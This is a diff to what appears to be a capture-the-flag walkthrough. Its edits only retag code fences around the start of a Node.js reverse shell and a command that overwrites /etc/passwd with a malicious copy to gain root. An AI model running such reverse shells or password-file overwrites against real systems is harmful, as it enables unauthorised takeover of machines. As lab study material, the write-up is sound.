@@ -170,7 +170,7 @@ When attempting to create a 'New Event Log' with our new admin userLevel cookie 
 
 We now need to attempt to upload a reverse shell compatible with Node.js and with the assistance of [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs) we have one
 
-~~~shell
+~~~javascript
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -280,7 +280,9 @@ passwd              100%[===================>]   1.30K  --.-KB/s    in 0s
 
 Lastly I used the 'cp' binary to replace the existing /etc/passwd with our malicious passwd file
 
+~~~shell
 sh-5.0$ cp passwd /etc/passwd
+~~~
 
 Finally we can elevate privileges to root (it will no longer prompt for a password for root as we have removed the 'x' parameter in the /etc/passwd file)
 
